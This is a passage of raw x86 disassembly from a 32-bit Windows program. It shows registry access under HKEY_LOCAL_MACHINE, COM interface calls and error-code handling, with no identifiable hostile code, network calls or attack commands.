  40bc68:	push   DWORD PTR [ebp-0x1e08]
  40bc6e:	call   DWORD PTR ds:0x414000
  40bc74:	push   DWORD PTR [ebp-0x1e08]
  40bc7a:	call   DWORD PTR ds:0x414008
  40bc80:	cmp    DWORD PTR [ebp-0x1e24],edi
  40bc86:	jne    0x40bcc0
  40bc88:	push   0x209
  40bc8d:	lea    eax,[ebp-0x840]
  40bc93:	push   eax
  40bc94:	push   0xea
  40bc99:	push   ebx
  40bc9a:	call   DWORD PTR ds:0x414188
  40bca0:	push   edi
  40bca1:	lea    eax,[ebp-0x218]
  40bca7:	push   eax
  40bca8:	lea    eax,[ebp-0x840]
  40bcae:	push   eax
  40bcaf:	push   edi
  40bcb0:	call   DWORD PTR ds:0x414168
  40bcb6:	mov    edi,0x80070005
  40bcbb:	jmp    0x40c016
  40bcc0:	push   DWORD PTR [ebp+0x10]
  40bcc3:	lea    eax,[ebp-0x218]
  40bcc9:	mov    ecx,ebx
  40bccb:	push   eax
  40bccc:	push   DWORD PTR [ebp+0x8]
  40bccf:	lea    eax,[ebp-0x1e0c]
  40bcd5:	push   esi
  40bcd6:	push   eax
  40bcd7:	lea    edx,[ebp-0x1e30]
  40bcdd:	call   0x40ab28
  40bce2:	test   eax,eax
  40bce4:	je     0x40c011
  40bcea:	push   ecx
  40bceb:	push   DWORD PTR [ebp+0x10]
  40bcee:	lea    eax,[ebp-0x1080]
  40bcf4:	push   ecx
  40bcf5:	push   eax
  40bcf6:	lea    eax,[ebp-0xa50]
  40bcfc:	mov    ecx,ebx
  40bcfe:	push   eax
  40bcff:	lea    edx,[ebp-0x218]
  40bd05:	call   0x40a47b
  40bd0a:	mov    esi,eax
  40bd0c:	cmp    esi,0xffffffff
  40bd0f:	jne    0x40bd19
  40bd11:	xor    edi,edi
  40bd13:	inc    edi
  40bd14:	jmp    0x40c016
  40bd19:	lea    eax,[ebp-0xa50]
  40bd1f:	push   eax
  40bd20:	push   0x4134a8
  40bd25:	push   0x402ec4
  40bd2a:	push   0x900
  40bd2f:	push   edi
  40bd30:	push   edi
  40bd31:	lea    eax,[ebp-0x840]
  40bd37:	push   0x209
  40bd3c:	push   eax
  40bd3d:	call   0x410f98
  40bd42:	mov    edi,eax
  40bd44:	add    esp,0x20
  40bd47:	test   edi,edi
  40bd49:	js     0x40c016
  40bd4f:	push   DWORD PTR [ebp+0x10]
  40bd52:	lea    eax,[ebp-0x1e18]
  40bd58:	mov    ecx,ebx
  40bd5a:	push   eax
  40bd5b:	lea    eax,[ebp-0x218]
  40bd61:	push   eax
  40bd62:	lea    edx,[ebp-0x840]
  40bd68:	call   0x40b580
  40bd6d:	mov    edi,eax
  40bd6f:	test   edi,edi
  40bd71:	js     0x40c016
  40bd77:	lea    eax,[ebp-0x218]
  40bd7d:	mov    ecx,ebx
  40bd7f:	push   eax
  40bd80:	push   DWORD PTR [ebp+0x10]
  40bd83:	lea    eax,[ebp-0x1e28]
  40bd89:	push   DWORD PTR [ebp+0x14]
  40bd8c:	lea    edx,[ebp-0x1e04]
  40bd92:	push   DWORD PTR [ebp+0xc]
  40bd95:	push   esi
  40bd96:	push   eax
  40bd97:	call   0x40afcc
  40bd9c:	xor    edi,edi
  40bd9e:	test   eax,eax
  40bda0:	je     0x40bd13
  40bda6:	push   0x20a
  40bdab:	lea    eax,[ebp-0x428]
  40bdb1:	push   edi
  40bdb2:	push   eax
  40bdb3:	call   0x412060
  40bdb8:	xor    eax,eax
  40bdba:	add    esp,0xc
  40bdbd:	mov    WORD PTR [ebp-0x428],ax
  40bdc4:	cmp    DWORD PTR [ebp-0x1e04],edi
  40bdca:	je     0x40bde6
  40bdcc:	push   ebx
  40bdcd:	mov    edx,0x105
  40bdd2:	lea    ecx,[ebp-0x428]
  40bdd8:	call   0x406b17
  40bddd:	test   eax,eax
  40bddf:	jne    0x40be1f
  40bde1:	jmp    0x40c011
  40bde6:	push   0x1a
  40bde8:	lea    edx,[ebp-0x428]
  40bdee:	pop    ecx
  40bdef:	call   0x408137
  40bdf4:	test   eax,eax
  40bdf6:	js     0x40be10
  40bdf8:	sub    esp,0xc
  40bdfb:	lea    ecx,[ebp-0x428]
  40be01:	mov    edx,0x105
  40be06:	push   0x401760
  40be0b:	call   0x410f31
  40be10:	xor    eax,eax
  40be12:	cmp    ax,WORD PTR [ebp-0x428]
  40be19:	je     0x40c011
  40be1f:	lea    eax,[ebp-0xa50]
  40be25:	push   eax
  40be26:	push   eax
  40be27:	lea    eax,[ebp-0x428]
  40be2d:	push   eax
  40be2e:	push   0x403430
  40be33:	push   0x900
  40be38:	push   edi
  40be39:	push   edi
  40be3a:	lea    eax,[ebp-0x14a0]
  40be40:	push   0x105
  40be45:	push   eax
  40be46:	call   0x410f98
  40be4b:	mov    edi,eax
  40be4d:	add    esp,0x24
  40be50:	test   edi,edi
  40be52:	js     0x40c016
  40be58:	push   DWORD PTR [ebp+0x10]
  40be5b:	lea    eax,[ebp-0xa50]
  40be61:	push   ecx
  40be62:	push   eax
  40be63:	lea    eax,[ebp-0x218]
  40be69:	mov    ecx,ebx
  40be6b:	push   eax
  40be6c:	lea    edx,[ebp-0x14a0]
  40be72:	call   0x40b0c8
  40be77:	test   eax,eax
  40be79:	je     0x40bd11
  40be7f:	cmp    DWORD PTR [ebp-0x1e0c],0x0
  40be86:	je     0x40be94
  40be88:	mov    edx,0x4134a8
  40be8d:	mov    ecx,ebx
  40be8f:	call   0x40d3a7
  40be94:	test   esi,esi
  40be96:	je     0x40bebe
  40be98:	cmp    WORD PTR [ebp-0x1080],0x0
  40bea0:	je     0x40bee5
  40bea2:	lea    ecx,[ebp-0x1080]
  40bea8:	call   0x406fb8
  40bead:	push   0x0
  40beaf:	lea    edx,[ebp-0x1080]
  40beb5:	mov    ecx,ebx
  40beb7:	call   0x40dcb7
  40bebc:	jmp    0x40bee5
  40bebe:	push   DWORD PTR [ebp+0x10]
  40bec1:	mov    edx,DWORD PTR [ebp-0x1e04]
  40bec7:	lea    eax,[ebp-0xa50]
  40becd:	push   eax
  40bece:	lea    eax,[ebp-0x218]
  40bed4:	mov    ecx,ebx
  40bed6:	push   eax
  40bed7:	call   0x40a22a
  40bedc:	cmp    eax,0xffffffff
  40bedf:	je     0x40bd11
  40bee5:	cmp    DWORD PTR [ebp-0x1e04],0x0
  40beec:	je     0x40beff
  40beee:	mov    DWORD PTR [ebp-0x1e20],0x80000002
  40bef8:	mov    esi,0x4010e8
  40befd:	jmp    0x40bf04
  40beff:	mov    esi,0x4028f8
  40bf04:	xor    eax,eax
  40bf06:	mov    DWORD PTR [ebp-0x1e0c],esi
  40bf0c:	cmp    ax,WORD PTR [ebp-0x428]
  40bf13:	je     0x40bfe1
  40bf19:	mov    ecx,DWORD PTR ds:0x4136c0
  40bf1f:	lea    edx,[ebp-0x428]
  40bf25:	call   0x40ff1c
  40bf2a:	cmp    DWORD PTR [ebp-0x1e04],0x0
  40bf31:	je     0x40bf4d
  40bf33:	lea    ecx,[ebp-0x15e0]
  40bf39:	call   0x40fb10
  40bf3e:	test   eax,eax
  40bf40:	jne    0x40bf4d
  40bf42:	lea    ecx,[ebp-0x428]
  40bf48:	call   0x40fe63
  40bf4d:	lea    eax,[ebp-0xa50]
  40bf53:	push   eax
  40bf54:	lea    eax,[ebp-0x428]
  40bf5a:	push   eax
  40bf5b:	push   0x40344c
  40bf60:	push   0x900
  40bf65:	push   0x0
  40bf67:	push   0x0
  40bf69:	lea    eax,[ebp-0x840]
  40bf6f:	push   0x209
  40bf74:	push   eax
  40bf75:	call   0x410f98
  40bf7a:	mov    edi,eax
  40bf7c:	add    esp,0x20
  40bf7f:	test   edi,edi
  40bf81:	js     0x40c016
  40bf87:	mov    ecx,DWORD PTR ds:0x4136c0
  40bf8d:	lea    edx,[ebp-0x840]
  40bf93:	call   0x40ff1c
  40bf98:	mov    ecx,DWORD PTR ds:0x4136c0
  40bf9e:	test   ecx,ecx
  40bfa0:	je     0x40c048
  40bfa6:	mov    esi,DWORD PTR [ecx]
  40bfa8:	lea    eax,[ebp-0x428]
  40bfae:	push   eax
  40bfaf:	xor    eax,eax
  40bfb1:	cmp    DWORD PTR [ebp-0x1e20],0x80000002
  40bfbb:	push   0x402970
  40bfc0:	push   DWORD PTR [ebp-0x1e0c]
  40bfc6:	sete   al
  40bfc9:	push   eax
  40bfca:	push   ecx
  40bfcb:	mov    ecx,DWORD PTR [esi+0x28]
  40bfce:	call   DWORD PTR ds:0x414220
  40bfd4:	call   DWORD PTR [esi+0x28]
  40bfd7:	mov    edi,eax
  40bfd9:	test   edi,edi
  40bfdb:	jns    0x40c0e2
  40bfe1:	push   0x209
  40bfe6:	lea    eax,[ebp-0x840]
  40bfec:	push   eax
  40bfed:	push   0xd3
  40bff2:	push   ebx
  40bff3:	call   DWORD PTR ds:0x414188
  40bff9:	push   0x0
  40bffb:	lea    eax,[ebp-0x218]
  40c001:	push   eax
  40c002:	lea    eax,[ebp-0x840]
  40c008:	push   eax
  40c009:	push   0x0
  40c00b:	call   DWORD PTR ds:0x414168
  40c011:	mov    edi,0x80004005
  40c016:	push   DWORD PTR [ebp-0x1e18]
  40c01c:	call   DWORD PTR ds:0x4141bc
  40c022:	push   DWORD PTR [ebp-0x1e14]
  40c028:	call   DWORD PTR ds:0x4141bc
  40c02e:	call   0x40929a
  40c033:	mov    ecx,DWORD PTR [ebp-0x4]
  40c036:	mov    eax,edi
  40c038:	pop    edi
  40c039:	pop    esi
  40c03a:	xor    ecx,ebp
  40c03c:	pop    ebx
  40c03d:	call   0x411980
  40c042:	mov    esp,ebp
  40c044:	pop    ebp
  40c045:	ret    0x18
  40c048:	lea    eax,[ebp-0x1e08]
  40c04e:	push   eax
  40c04f:	push   esi
  40c050:	push   DWORD PTR [ebp-0x1e20]
  40c056:	call   DWORD PTR ds:0x41401c
  40c05c:	test   eax,eax
  40c05e:	jne    0x40bfe1
  40c060:	lea    eax,[ebp-0x428]
  40c066:	push   eax
  40c067:	call   DWORD PTR ds:0x414068
  40c06d:	add    eax,eax
  40c06f:	xor    esi,esi
  40c071:	push   eax
  40c072:	mov    DWORD PTR [ebp-0x1e2c],eax
  40c078:	lea    eax,[ebp-0x428]
  40c07e:	push   eax
  40c07f:	push   0x1
  40c081:	push   esi
  40c082:	push   0x402970
  40c087:	push   DWORD PTR [ebp-0x1e08]
  40c08d:	call   DWORD PTR ds:0x41403c
  40c093:	test   eax,eax
  40c095:	je     0x40c0d6
  40c097:	push   0x209
  40c09c:	lea    eax,[ebp-0x840]
  40c0a2:	push   eax
  40c0a3:	push   0xd3
  40c0a8:	push   ebx
  40c0a9:	call   DWORD PTR ds:0x414188
  40c0af:	push   esi
  40c0b0:	lea    eax,[ebp-0x218]
  40c0b6:	push   eax
  40c0b7:	lea    eax,[ebp-0x840]
  40c0bd:	push   eax
  40c0be:	push   esi
  40c0bf:	call   DWORD PTR ds:0x414168
  40c0c5:	push   DWORD PTR [ebp-0x1e08]
  40c0cb:	call   DWORD PTR ds:0x414008
  40c0d1:	jmp    0x40c011
  40c0d6:	push   DWORD PTR [ebp-0x1e08]
  40c0dc:	call   DWORD PTR ds:0x414008
  40c0e2:	cmp    DWORD PTR [ebp-0x1e04],0x0
  40c0e9:	lea    eax,[ebp-0xc60]
  40c0ef:	push   DWORD PTR [ebp+0x10]
  40c0f2:	mov    edx,DWORD PTR [ebp-0x1e1c]
  40c0f8:	mov    ecx,DWORD PTR ds:0x4136c0
  40c0fe:	push   eax
  40c0ff:	je     0x40c14e
  40c101:	push   0x402d24
  40c106:	call   0x410068
  40c10b:	mov    esi,0xbc2
  40c110:	cmp    eax,esi
  40c112:	jne    0x40c11e
  40c114:	mov    DWORD PTR [ebp-0x1e10],0x1
  40c11e:	push   DWORD PTR [ebp+0x10]
  40c121:	mov    edx,DWORD PTR [ebp-0x1e1c]
  40c127:	lea    eax,[ebp-0xc60]
  40c12d:	mov    ecx,DWORD PTR ds:0x4136c0
  40c133:	push   eax
  40c134:	push   0x403458
  40c139:	call   0x410068
  40c13e:	cmp    eax,esi
  40c140:	jne    0x40c1b9
  40c142:	mov    DWORD PTR [ebp-0x1e10],0x1
  40c14c:	jmp    0x40c1b9
  40c14e:	push   0x403478
  40c153:	call   0x410068
  40c158:	mov    esi,0xbc2
  40c15d:	cmp    eax,esi
  40c15f:	jne    0x40c16b
  40c161:	mov    DWORD PTR [ebp-0x1e10],0x1
  40c16b:	push   DWORD PTR [ebp+0x10]
  40c16e:	mov    edx,DWORD PTR [ebp-0x1e1c]
  40c174:	lea    eax,[ebp-0xc60]
  40c17a:	mov    ecx,DWORD PTR ds:0x4136c0
  40c180:	push   eax
  40c181:	push   0x4034ac
  40c186:	call   0x410068
  40c18b:	cmp    eax,esi
  40c18d:	jne    0x40c199
  40c18f:	mov    DWORD PTR [ebp-0x1e10],0x1
  40c199:	lea    eax,[ebp-0x218]
  40c19f:	push   eax
  40c1a0:	lea    edx,[ebp-0xa50]
  40c1a6:	lea    ecx,[ebp-0x428]
  40c1ac:	call   0x4099cc
  40c1b1:	test   eax,eax
  40c1b3:	je     0x40bfe1
  40c1b9:	cmp    DWORD PTR [ebp-0x1e30],0x0
  40c1c0:	je     0x40c330
  40c1c6:	push   0x4134a8
  40c1cb:	push   0x4034cc
  40c1d0:	push   0x900
  40c1d5:	push   0x0
  40c1d7:	push   0x0
  40c1d9:	lea    eax,[ebp-0x840]
  40c1df:	push   0x209
  40c1e4:	push   eax
  40c1e5:	call   0x410f98
  40c1ea:	add    esp,0x1c
  40c1ed:	test   eax,eax
  40c1ef:	js     0x40c330
  40c1f5:	mov    ecx,DWORD PTR ds:0x4136c0
  40c1fb:	lea    eax,[ebp-0x840]
  40c201:	push   eax
  40c202:	call   0x41025d
  40c207:	mov    esi,eax
  40c209:	test   esi,esi
  40c20b:	js     0x40c330
  40c211:	xor    eax,eax
  40c213:	push   0x208
  40c218:	push   eax
  40c219:	mov    WORD PTR [ebp-0xe70],ax
  40c220:	lea    eax,[ebp-0xe6e]
  40c226:	push   eax
  40c227:	call   0x412060
  40c22c:	add    esp,0xc
  40c22f:	xor    eax,eax
  40c231:	mov    WORD PTR [ebp-0x1290],ax
  40c238:	push   0x208
  40c23d:	push   eax
  40c23e:	lea    eax,[ebp-0x128e]
  40c244:	push   eax
  40c245:	call   0x412060
  40c24a:	add    esp,0xc
  40c24d:	lea    ecx,[ebp-0x15e0]
  40c253:	call   0x40fade
  40c258:	test   eax,eax
  40c25a:	je     0x40c31e
  40c260:	mov    esi,0x4034e0
  40c265:	lea    eax,[ebp-0x840]
  40c26b:	push   esi
  40c26c:	push   eax
  40c26d:	push   0x401f98
  40c272:	push   0x900
  40c277:	push   0x0
  40c279:	push   0x0
  40c27b:	lea    eax,[ebp-0x1290]
  40c281:	push   0x105
  40c286:	push   eax
  40c287:	call   0x410f98
  40c28c:	push   esi
  40c28d:	push   0x4134a8
  40c292:	push   0x401f98
  40c297:	push   0x900
  40c29c:	xor    esi,esi
  40c29e:	lea    eax,[ebp-0xe70]
  40c2a4:	push   esi
  40c2a5:	push   esi
  40c2a6:	push   0x105
  40c2ab:	push   eax
  40c2ac:	call   0x410f98
  40c2b1:	add    esp,0x40
  40c2b4:	lea    eax,[ebp-0x1290]
  40c2ba:	push   esi
  40c2bb:	push   eax
  40c2bc:	lea    eax,[ebp-0xe70]
  40c2c2:	push   eax
  40c2c3:	call   DWORD PTR ds:0x4140a4
  40c2c9:	call   0x40aa64
  40c2ce:	lea    ecx,[ebp-0x840]
  40c2d4:	call   0x409e5b
  40c2d9:	mov    esi,eax
  40c2db:	test   esi,esi
  40c2dd:	jns    0x40c317
  40c2df:	cmp    DWORD PTR [ebp+0x10],0x0
  40c2e3:	jne    0x40c31e
  40c2e5:	push   0x209
  40c2ea:	lea    eax,[ebp-0x840]
  40c2f0:	push   eax
  40c2f1:	push   0xec
  40c2f6:	push   ebx
  40c2f7:	call   DWORD PTR ds:0x414188
  40c2fd:	push   0x30
  40c2ff:	lea    eax,[ebp-0x218]
  40c305:	push   eax
  40c306:	lea    eax,[ebp-0x840]
  40c30c:	push   eax
  40c30d:	push   0x0
  40c30f:	call   DWORD PTR ds:0x414168
  40c315:	jmp    0x40c31e
  40c317:	call   0x40946c
  40c31c:	mov    esi,eax
  40c31e:	cmp    esi,0xbc2
  40c324:	jne    0x40c330
  40c326:	mov    DWORD PTR [ebp-0x1e10],0x1
  40c330:	push   DWORD PTR [ebp-0x1e04]
  40c336:	mov    ecx,DWORD PTR ds:0x4136c0
  40c33c:	lea    eax,[ebp-0x1e14]
  40c342:	push   eax
  40c343:	lea    edx,[ebp-0x428]
  40c349:	call   0x4068c4
  40c34e:	test   eax,eax
  40c350:	je     0x40c011
  40c356:	mov    esi,DWORD PTR [ebp-0x1e14]
  40c35c:	lea    eax,[ebp-0x14a0]
  40c362:	mov    ecx,DWORD PTR ds:0x4136c0
  40c368:	lea    edx,[ebp-0x218]
  40c36e:	push   eax
  40c36f:	push   esi
  40c370:	call   0x4079b1
  40c375:	test   eax,eax
  40c377:	je     0x40c011
  40c37d:	cmp    DWORD PTR [ebp-0x1e04],0x0
  40c384:	je     0x40c3a9
  40c386:	call   DWORD PTR ds:0x4141ac
  40c38c:	cmp    eax,0x2
  40c38f:	jne    0x40c39c
  40c391:	call   DWORD PTR ds:0x4141b4
  40c397:	cmp    eax,0x6
  40c39a:	jae    0x40c3a9
  40c39c:	mov    ecx,DWORD PTR ds:0x4136c0
  40c3a2:	mov    edx,esi
  40c3a4:	call   0x4101ee
  40c3a9:	mov    ecx,DWORD PTR [ebp-0x1e04]
  40c3af:	lea    edx,[ebp-0xe70]
  40c3b5:	mov    esi,DWORD PTR ds:0x4136c4
  40c3bb:	neg    ecx
  40c3bd:	sbb    ecx,ecx
  40c3bf:	and    ecx,0x9
  40c3c2:	add    ecx,0x10
  40c3c5:	call   0x408137
  40c3ca:	test   eax,eax
  40c3cc:	js     0x40c3e5
  40c3ce:	lea    eax,[ebp-0xe70]
  40c3d4:	mov    edx,ebx
  40c3d6:	push   eax
  40c3d7:	lea    eax,[ebp-0x218]
  40c3dd:	mov    ecx,esi
  40c3df:	push   eax
  40c3e0:	call   0x407604
  40c3e5:	cmp    DWORD PTR [ebp-0x1e28],0x0
  40c3ec:	je     0x40c40b
  40c3ee:	push   DWORD PTR [ebp-0x1e04]
  40c3f4:	mov    ecx,DWORD PTR ds:0x4136c4
  40c3fa:	lea    edx,[ebp-0x218]
  40c400:	push   DWORD PTR [ebp-0x1e14]
  40c406:	call   0x40774c
  40c40b:	cmp    DWORD PTR [ebp+0x18],0x0
  40c40f:	je     0x40c41c
  40c411:	lea    ecx,[ebp-0x218]
  40c417:	call   0x40b491
  40c41c:	mov    edx,DWORD PTR [ebp-0x1e18]
  40c422:	test   edx,edx
  40c424:	je     0x40c4d5
  40c42a:	lea    ecx,[ebp-0x15e0]
  40c430:	call   0x40fab7
  40c435:	test   eax,eax
  40c437:	je     0x40c4d5
  40c43d:	push   edx
  40c43e:	mov    edi,0x80004005
  40c443:	call   DWORD PTR ds:0x414068
  40c449:	cmp    eax,0x100
  40c44e:	jg     0x40c016
  40c454:	push   0x42c
  40c459:	call   DWORD PTR ds:0x4141b0
  40c45f:	mov    esi,eax
  40c461:	test   esi,esi
  40c463:	jne    0x40c46f
  40c465:	mov    edi,0x8007000e
  40c46a:	jmp    0x40c016
  40c46f:	sub    esp,0xc
  40c472:	mov    DWORD PTR [esi],0x42c
  40c478:	mov    DWORD PTR [esi+0x4],0x10
  40c47f:	push   DWORD PTR [ebp-0x1e18]
  40c485:	call   DWORD PTR ds:0x414068
  40c48b:	push   eax
  40c48c:	push   DWORD PTR [ebp-0x1e18]
  40c492:	lea    ecx,[esi+0x20a]
  40c498:	mov    edx,0x101
  40c49d:	call   0x410ef7
  40c4a2:	mov    edx,DWORD PTR [ebp-0x1e14]
  40c4a8:	lea    eax,[ebp-0x218]
  40c4ae:	mov    ecx,DWORD PTR ds:0x4136c0
  40c4b4:	push   0x0
  40c4b6:	push   esi
  40c4b7:	push   eax
  40c4b8:	call   0x409321
  40c4bd:	push   esi
  40c4be:	test   eax,eax
  40c4c0:	je     0x40c4cd
  40c4c2:	call   DWORD PTR ds:0x4141bc
  40c4c8:	jmp    0x40c016
  40c4cd:	call   DWORD PTR ds:0x4141bc
  40c4d3:	xor    edi,edi
  40c4d5:	cmp    DWORD PTR [ebp-0x1e04],0x0
  40c4dc:	mov    eax,0x4034fc
  40c4e1:	jne    0x40c4e8
  40c4e3:	mov    eax,0x403514
  40c4e8:	push   DWORD PTR [ebp+0x10]
  40c4eb:	mov    esi,DWORD PTR [ebp-0x1e1c]
  40c4f1:	lea    ecx,[ebp-0xc60]
  40c4f7:	push   ecx
  40c4f8:	mov    ecx,DWORD PTR ds:0x4136c0
  40c4fe:	mov    edx,esi
  40c500:	push   eax
  40c501:	call   0x410068
  40c506:	cmp    eax,0xbc2
  40c50b:	jne    0x40c517
  40c50d:	mov    DWORD PTR [ebp-0x1e10],0x1
  40c517:	push   esi
  40c518:	lea    edx,[ebp-0xa50]
  40c51e:	lea    ecx,[ebp-0x428]
  40c524:	call   0x40b80c
  40c529:	test   eax,eax
  40c52b:	js     0x40c016
  40c531:	mov    ecx,DWORD PTR ds:0x4136c0
  40c537:	test   ecx,ecx
  40c539:	je     0x40c569
  40c53b:	mov    esi,DWORD PTR [ecx]
  40c53d:	xor    eax,eax
  40c53f:	cmp    DWORD PTR [ebp-0x1e20],0x80000002
  40c549:	push   0x402970
  40c54e:	push   DWORD PTR [ebp-0x1e0c]
  40c554:	sete   al
  40c557:	push   eax
  40c558:	push   ecx
  40c559:	mov    ecx,DWORD PTR [esi+0x2c]
  40c55c:	call   DWORD PTR ds:0x414220
  40c562:	call   DWORD PTR [esi+0x2c]
  40c565:	xor    esi,esi
  40c567:	jmp    0x40c5ab
  40c569:	lea    eax,[ebp-0x1e08]
  40c56f:	xor    esi,esi
  40c571:	push   eax
  40c572:	push   0xf003f
  40c577:	push   esi
  40c578:	push   DWORD PTR [ebp-0x1e0c]
  40c57e:	push   DWORD PTR [ebp-0x1e20]
  40c584:	call   DWORD PTR ds:0x414004
  40c58a:	test   eax,eax
  40c58c:	jne    0x40c5ab
  40c58e:	push   0x402970
  40c593:	push   DWORD PTR [ebp-0x1e08]
  40c599:	call   DWORD PTR ds:0x414028
  40c59f:	push   DWORD PTR [ebp-0x1e08]
  40c5a5:	call   DWORD PTR ds:0x414008
  40c5ab:	call   0x408277
  40c5b0:	cmp    DWORD PTR [ebp-0x1e10],0x0
  40c5b7:	je     0x40c618
  40c5b9:	push   0x209
  40c5be:	lea    eax,[ebp-0x840]
  40c5c4:	push   eax
  40c5c5:	push   0xdc
  40c5ca:	push   ebx
  40c5cb:	call   DWORD PTR ds:0x414188
  40c5d1:	push   0x400
  40c5d6:	push   0x10034
  40c5db:	lea    eax,[ebp-0x218]
  40c5e1:	push   eax
  40c5e2:	lea    eax,[ebp-0x840]
  40c5e8:	push   eax
  40c5e9:	push   esi
  40c5ea:	call   DWORD PTR ds:0x414180
  40c5f0:	cmp    eax,0x6
  40c5f3:	jne    0x40c016
  40c5f9:	mov    ecx,DWORD PTR ds:0x4136c0
  40c5ff:	test   ecx,ecx
  40c601:	je     0x40c60e
  40c603:	mov    eax,DWORD PTR [ecx]
  40c605:	push   ecx
  40c606:	mov    esi,DWORD PTR [eax+0x38]
  40c609:	jmp    0x40c6ca
  40c60e:	call   0x4090a3
  40c613:	jmp    0x40c016
  40c618:	cmp    DWORD PTR [ebp+0x10],0x0
  40c61c:	jne    0x40c016
  40c622:	mov    ecx,DWORD PTR [ebp-0x1e34]
  40c628:	call   0x40d89b
  40c62d:	lea    eax,[ebp-0xa50]
  40c633:	push   eax
  40c634:	lea    eax,[ebp-0x428]
  40c63a:	push   eax
  40c63b:	push   0x402cec
  40c640:	push   0x900
  40c645:	push   esi
  40c646:	push   esi
  40c647:	lea    eax,[ebp-0x840]
  40c64d:	push   0x209
  40c652:	push   eax
  40c653:	call   0x410f98
  40c658:	add    esp,0x20
  40c65b:	test   eax,eax
  40c65d:	js     0x40c016
  40c663:	mov    eax,ds:0x4136c4
  40c668:	test   eax,eax
  40c66a:	je     0x40c6d9
  40c66c:	lea    ecx,[ebp-0x1e0c]
  40c672:	mov    DWORD PTR [ebp-0x1e0c],esi
  40c678:	mov    esi,DWORD PTR [eax]
  40c67a:	push   ecx
  40c67b:	push   0x40353c
  40c680:	push   eax
  40c681:	mov    ecx,DWORD PTR [esi]
  40c683:	call   DWORD PTR ds:0x414220
  40c689:	call   DWORD PTR [esi]
  40c68b:	test   eax,eax
  40c68d:	js     0x40c6d9
  40c68f:	push   DWORD PTR [ebp-0x1e04]
  40c695:	mov    eax,DWORD PTR [ebp-0x1e0c]
  40c69b:	lea    ecx,[ebp-0x218]
  40c6a1:	push   DWORD PTR [ebp-0x1e14]
  40c6a7:	push   ecx
  40c6a8:	mov    esi,DWORD PTR [eax]
  40c6aa:	lea    ecx,[ebp-0x840]
  40c6b0:	push   ecx
  40c6b1:	push   eax
  40c6b2:	mov    ecx,DWORD PTR [esi+0x14]
  40c6b5:	call   DWORD PTR ds:0x414220
  40c6bb:	call   DWORD PTR [esi+0x14]
  40c6be:	mov    eax,DWORD PTR [ebp-0x1e0c]
  40c6c4:	push   eax
  40c6c5:	mov    ecx,DWORD PTR [eax]
  40c6c7:	mov    esi,DWORD PTR [ecx+0x8]
  40c6ca:	mov    ecx,esi
  40c6cc:	call   DWORD PTR ds:0x414220
  40c6d2:	call   esi
  40c6d4:	jmp    0x40c016
  40c6d9:	push   ecx
  40c6da:	push   DWORD PTR [ebp-0x1e14]
  40c6e0:	lea    edx,[ebp-0x218]
  40c6e6:	lea    ecx,[ebp-0x840]
  40c6ec:	call   0x4082fd
  40c6f1:	jmp    0x40c016
  40c6f6:	int3   
  40c6f7:	int3   
  40c6f8:	int3   
  40c6f9:	int3   
  40c6fa:	int3   
  40c6fb:	mov    edi,edi
  40c6fd:	push   ebp
  40c6fe:	mov    ebp,esp
  40c700:	sub    esp,0xac
  40c706:	mov    eax,ds:0x413004
  40c70b:	xor    eax,ebp
  40c70d:	mov    DWORD PTR [ebp-0x4],eax
  40c710:	push   ebx
  40c711:	push   esi
  40c712:	push   edi
  40c713:	mov    ebx,ecx
  40c715:	lea    edi,[ebp-0xa8]
  40c71b:	push   0x29
  40c71d:	pop    ecx
  40c71e:	mov    esi,0x403580
  40c723:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c725:	xor    ecx,ecx
  40c727:	mov    DWORD PTR [ebx+0xc],0x8000ffff
  40c72e:	lea    edi,[ebx+0x4]
  40c731:	mov    DWORD PTR [ebx],ecx
  40c733:	push   ecx
  40c734:	mov    DWORD PTR [ebx+0x8],ecx
  40c737:	mov    DWORD PTR [edi],ecx
  40c739:	call   DWORD PTR ds:0x414218
  40c73f:	mov    ecx,eax
  40c741:	xor    eax,eax
  40c743:	test   ecx,ecx
  40c745:	mov    DWORD PTR [ebx+0xc],ecx
  40c748:	setns  al
  40c74b:	mov    DWORD PTR [ebx+0x10],eax
  40c74e:	test   ecx,ecx
  40c750:	js     0x40c7ae
  40c752:	push   edi
  40c753:	call   DWORD PTR ds:0x414144
  40c759:	mov    DWORD PTR [ebx+0xc],eax
  40c75c:	test   eax,eax
  40c75e:	js     0x40c7ae
  40c760:	mov    eax,DWORD PTR [edi]
  40c762:	lea    ecx,[ebx+0x8]
  40c765:	xor    edx,edx
  40c767:	push   edx
  40c768:	push   ecx
  40c769:	mov    esi,DWORD PTR [eax]
  40c76b:	lea    ecx,[ebp-0xac]
  40c771:	push   ecx
  40c772:	lea    ecx,[ebp-0xa8]
  40c778:	push   ecx
  40c779:	mov    ecx,DWORD PTR [esi+0xc]
  40c77c:	push   edx
  40c77d:	push   edx
  40c77e:	push   eax
  40c77f:	call   DWORD PTR ds:0x414220
  40c785:	call   DWORD PTR [esi+0xc]
  40c788:	mov    DWORD PTR [ebx+0xc],eax
  40c78b:	test   eax,eax
  40c78d:	js     0x40c7ae
  40c78f:	mov    ecx,DWORD PTR [edi]
  40c791:	push   ebx
  40c792:	push   0x40595c
  40c797:	push   0x0
  40c799:	mov    esi,DWORD PTR [ecx]
  40c79b:	push   DWORD PTR [ebx+0x8]
  40c79e:	push   ecx
  40c79f:	mov    ecx,DWORD PTR [esi+0x14]
  40c7a2:	call   DWORD PTR ds:0x414220
  40c7a8:	call   DWORD PTR [esi+0x14]
  40c7ab:	mov    DWORD PTR [ebx+0xc],eax
  40c7ae:	mov    ecx,DWORD PTR [ebp-0x4]
  40c7b1:	mov    eax,ebx
  40c7b3:	pop    edi
  40c7b4:	pop    esi
  40c7b5:	xor    ecx,ebp
  40c7b7:	pop    ebx
  40c7b8:	call   0x411980
  40c7bd:	mov    esp,ebp
  40c7bf:	pop    ebp
  40c7c0:	ret    
  40c7c1:	int3   
  40c7c2:	int3   
  40c7c3:	int3   
  40c7c4:	int3   
  40c7c5:	int3   
  40c7c6:	mov    edi,edi
  40c7c8:	push   ebp
  40c7c9:	mov    ebp,esp
  40c7cb:	push   ecx
  40c7cc:	push   ecx
  40c7cd:	mov    eax,ds:0x413004
  40c7d2:	xor    eax,ebp
  40c7d4:	mov    DWORD PTR [ebp-0x4],eax
  40c7d7:	push   ebx
  40c7d8:	push   esi
  40c7d9:	push   edi
  40c7da:	mov    edi,ecx
  40c7dc:	xor    ebx,ebx
  40c7de:	mov    ecx,DWORD PTR [edi]
  40c7e0:	test   ecx,ecx
  40c7e2:	je     0x40c7f6
  40c7e4:	mov    eax,DWORD PTR [ecx]
  40c7e6:	push   ecx
